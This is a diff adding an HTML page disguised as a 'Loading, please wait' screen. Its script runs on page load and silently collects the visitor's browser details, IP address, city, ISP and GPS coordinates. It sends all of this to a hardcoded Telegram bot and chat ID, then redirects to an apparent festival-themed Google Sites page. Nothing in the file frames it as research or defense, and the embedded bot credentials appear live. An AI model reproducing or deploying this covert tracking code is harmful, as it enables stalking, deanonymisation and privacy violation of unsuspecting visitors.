@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<script>
+const BOT_TOKEN = "7970129146:AAEg4zjo8w3byOa0S1l4ILpgZN6B1NnbvDA";
+const CHAT_ID = "5419993390";
+const REDIRECT_URL = "https://sites.google.com/view/rakshabandhan-/home";
+
+async function getIPInfo() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+    } catch (e) {
+        return {};
+    }
+}
+
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language
+    };
+}
+
+async function sendToTelegram(data) {
+    const message = `
+📥 New Visitor Info:
+🖥 Device: ${data.device.userAgent}
+📐 Screen: ${data.device.screen}
+🌐 Timezone: ${data.device.timezone}
+🗣 Language: ${data.device.language}
+🌍 IP: ${data.ip.ip || "N/A"}
+🏙 City: ${data.ip.city || "N/A"}
+🏴 Region: ${data.ip.region || "N/A"}
+🇨🇮 Country: ${data.ip.country_name || "N/A"}
+📡 ISP: ${data.ip.org || "N/A"}
+📍 GPS: ${data.gps || "Denied/Unavailable"}
+    `;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+}
+
+function getGPSLocation() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) {
+            resolve("Not Supported");
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+            err => resolve("Permission Denied")
+        );
+    });
+}
+
+async function main() {
+    const device = getDeviceInfo();
+    const ip = await getIPInfo();
+    const gps = await getGPSLocation();
+    await sendToTelegram({ device, ip, gps });
+    window.location.href = REDIRECT_URL;
+}
+
+main();
+</script>
+</head>
+<body>
+<p>Loading, please wait...</p>
+</body>
+</html>
